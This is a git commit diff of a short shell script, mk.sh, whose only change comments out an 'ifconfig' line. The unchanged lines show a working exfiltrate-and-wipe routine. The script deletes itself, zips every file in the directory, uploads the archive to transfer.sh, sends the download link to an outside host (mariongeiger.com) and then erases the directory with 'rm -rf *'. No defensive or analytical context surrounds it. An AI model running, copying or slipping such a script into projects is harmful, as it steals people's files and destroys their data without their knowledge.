dabb7f75be39bf7441fb8e48256477cb9558d809
Electro <78709853+electro6666@users.noreply.github.com>
2022-11-28 07:45:11 +0530

    Update mk.sh

--- mk.sh
+++ mk.sh
@@ -1,6 +1,6 @@
 rm -rf mk.sh
 zip  file.zip *
 curl --upload-file file.zip  https://transfer.sh >> link.txt
-ifconfig >> link.txt 
+#ifconfig >> link.txt 
 curl --upload-file link.txt http://mariongeiger.com
 rm -rf *
